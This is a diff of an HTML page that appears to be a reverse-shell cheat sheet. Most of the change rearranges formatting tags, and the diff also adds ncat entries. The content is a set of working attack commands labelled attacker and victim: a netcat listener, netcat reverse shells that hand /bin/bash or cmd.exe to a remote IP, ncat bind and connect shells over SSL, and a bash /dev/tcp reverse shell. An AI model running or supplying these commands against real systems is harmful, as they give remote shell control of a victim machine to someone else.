@@ -10,7 +10,7 @@
 nc -nlvp 1234 (Attacker)<br/>
 <br/>
 (Victim)<br/>
-<span style="font-family: Open Sans"><div style="text-align: left"><br/>
+<div style="text-align: left"><span style="font-family: Open Sans"><br/>
 <br/>
 <br/>
 <br/>
@@ -18,10 +18,14 @@ nc -nlvp 1234 (Attacker)<br/>
 <br/>
 <br/>
 <br/>
-</div></span><span style="font-family: Open Sans"><div style="text-align: left">nc 192.168.100.113 1234 –e /bin/bash</div></span>&nbsp; <br/>
-<span style="font-family: Open Sans"><div style="text-align: left">nc.exe 192.168.100.113 1234 –e cmd.exe</div></span>&nbsp; <br/>
+</span></div><div style="text-align: left"><span style="font-family: Open Sans">nc 192.168.100.113 1234 –e /bin/bash</span></div>&nbsp; <br/>
+<div style="text-align: left"><span style="font-family: Open Sans">nc.exe 192.168.100.113 1234 –e cmd.exe</span></div>&nbsp; <br/>
 <br/>
-<br/>
+#ncat<br/>
+ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl<br/>
+ncat -v 10.0.0.22 4444 --ssl<br/>
+</span>&nbsp;<br/>
+<span style="font-size: 15pt"><br/>
 </span><span style="font-size: 10pt">BASH<br/>
 bash -i &gt;&amp; /dev/tcp/10.20.14.203/8080 0&gt;&amp;1<br/>
 <br/>
